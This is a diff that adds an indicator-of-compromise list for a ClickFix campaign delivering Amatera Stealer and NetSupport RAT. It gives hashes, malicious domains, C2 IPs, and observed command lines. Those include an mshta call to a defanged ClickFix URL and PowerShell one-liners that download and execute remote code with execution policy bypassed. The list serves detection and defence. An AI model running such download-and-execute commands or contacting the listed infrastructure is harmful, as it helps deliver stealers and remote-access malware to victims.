@@ -1,0 +1,35 @@
+File:
+
+ea84d5dacc5cae7e57782678a0e9bba016e959580bb1c6b2c4a02c51c8288039 - PowerShell stage AMSI_RESULT_NOT_DETECTED
+df98ce80d4437d77f2c6c7fa58c82d8cd4da37f2a0cc4b5b1e0c7d48ca4c4dd8 - PowerShell stage AmsiScanBuffer patcher/loader
+8d84596d648444e668ee40e3ee1467b5d9ca1f7bc346778ab6aa66bad84cb7af - .NET downloader that leads to Pure Crypter payload
+c96d51f37b676b0fed0c5c512adfac703f397a0b695ad490cde0aa737aaa248e - Pure Crypter payload dll
+26db2f20d3d84657af15509ba39f62690a06175c2d5671795e239bdbe3acbaef - Amatera Stealer
+a61a2efaad92e5888cf20cb2bf96b9874eac5d5aadf6456c76926ab90cbe74d7 - Amatera Stealer
+168f1b974b31df0889e6dbe75f0fe8486cf932d72f0d6ad8348c97a2e537a738 - NetSupport Manager (client32.exe)
+aad4b827858210d101ccd9f75b2caa7d207ff7dde9e7f8f8c587a0b11d198b2b - NetSupport Manager zip
+
+Domain:
+
+c70ye.ru - ClickFix
+ci6ef.ru - ClickFix
+kuq5g.ru - ClickFix
+ha0m.ru - ClickFix
+congenialespresso.top - NET Support RAT payload JPG via PowerShell delivered by Amatera
+unpopularnational.com - Contacted via PowerShell delivered by Amatera
+
+
+IP:
+
+178.156.176.74 - Amatera Stealer C2
+91.98.229.246 - Amatera Stealer C2
+87.120.219.26 - NetSupport Dropper IP
+45.94.47.224 - NetSupport RAT C2
+77.110.107.175 - A record for unpopularnational.com
+
+Command Line:
+
+mshta.exe hxxps://h2.kuq5g.ru/pwuwa75b UserAuth: Answer the bot-block challenge. Ref: 0698
+powershell -w h iex(irm <REDACTED>)
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('<REDACTED>')"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -File "<REDACTED>"
